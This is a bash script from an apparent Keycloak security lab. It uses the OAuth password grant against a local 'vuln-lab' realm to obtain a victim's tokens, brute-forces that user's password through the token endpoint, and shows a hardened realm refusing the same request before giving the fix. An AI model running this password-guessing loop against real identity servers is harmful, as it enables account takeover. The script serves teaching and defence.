#!/usr/bin/env bash
#
# Direct Access Grant (ROPC / password grant) against vuln-lab.
# vuln-rp allows the password grant, so a username+password can be traded for
# tokens with no browser, and with brute-force protection off the token endpoint
# becomes a password-guessing oracle. secure-lab's demo-rp refuses it.
# Lab only; targets the local Keycloak in this repo.
set -euo pipefail

KC="${KC:-http://localhost:8080}"
VULN_REALM="vuln-lab"
VULN_CLIENT="vuln-rp"
SEC_REALM="secure-lab"
SEC_CLIENT="demo-rp"

bold() { printf '\033[1m%s\033[0m\n' "$1"; }

token_endpoint() { echo "$KC/realms/$1/protocol/openid-connect/token"; }

# 1) Straight password-grant: get tokens for a known user
bold "[1] Password grant against $VULN_REALM (victim / Password1)"
RESP="$(curl -s -X POST "$(token_endpoint "$VULN_REALM")" \
  -d grant_type=password -d client_id="$VULN_CLIENT" \
  -d username=victim -d password=Password1 -d scope=openid)"

if echo "$RESP" | grep -q access_token; then
  AT="$(echo "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')"
  echo "  -> SUCCESS: received an access token."
  # Decode the payload (display only) to prove it is a real token for 'victim'.
  echo "$AT" | python3 - "$AT" <<'PY'
import sys, json, base64
tok = sys.argv[1]
p = tok.split('.')[1]; p += '=' * (-len(p) % 4)
c = json.loads(base64.urlsafe_b64decode(p))
print("     sub:   ", c.get("sub"))
print("     user:  ", c.get("preferred_username"))
print("     roles: ", c.get("realm_access", {}).get("roles"))
PY
else
  echo "  -> unexpected: $RESP"
fi
echo

# 2) Brute force: the endpoint is an online password oracle
bold "[2] Brute forcing 'victim' (no lockout on vuln-lab)"
for pw in 123456 password qwerty letmein Password1 admin; do
  code="$(curl -s -o /dev/null -w '%{http_code}' -X POST "$(token_endpoint "$VULN_REALM")" \
    -d grant_type=password -d client_id="$VULN_CLIENT" \
    -d username=victim -d password="$pw" -d scope=openid)"
  if [ "$code" = "200" ]; then
    echo "  [+] FOUND: victim / $pw   (HTTP $code)"
    break
  else
    echo "  [-] tried $pw -> HTTP $code"
  fi
done
echo

# 3) Same attack against secure-lab: refused
bold "[3] Same password grant against $SEC_REALM (defense in place)"
curl -s -X POST "$(token_endpoint "$SEC_REALM")" \
  -d grant_type=password -d client_id="$SEC_CLIENT" \
  -d username=alice -d password=alice-password -d scope=openid \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print("  -> REFUSED:",d.get("error"),"-",d.get("error_description"))'
echo
bold "Done. Fix: disable Direct Access Grants; use Authorization Code + PKCE."
